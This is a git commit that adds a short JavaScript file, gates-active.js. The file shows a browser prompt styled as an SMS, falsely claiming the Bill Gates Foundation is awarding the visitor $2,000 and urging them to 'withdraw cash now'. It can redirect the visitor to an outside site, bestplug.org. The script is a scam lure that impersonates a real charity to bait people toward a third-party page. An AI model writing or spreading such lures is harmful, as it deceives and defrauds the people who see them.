7b6e60fe7741dff95d7603166ef25a02b1152170
vibeblog <enom02567@gmail.com>
2025-05-10 08:24:42 +0100

    Create gates-active.js

---
+++ gates-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW $2,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive $2,000 from Bill Gates Foundation, Press Ok to withdraw cash Now ','WITHDRAW $2,000');
+if (password != 'WITHDRAW $2,000') {
+location.href='https://bestplug.org/gate-fund.html';
+}
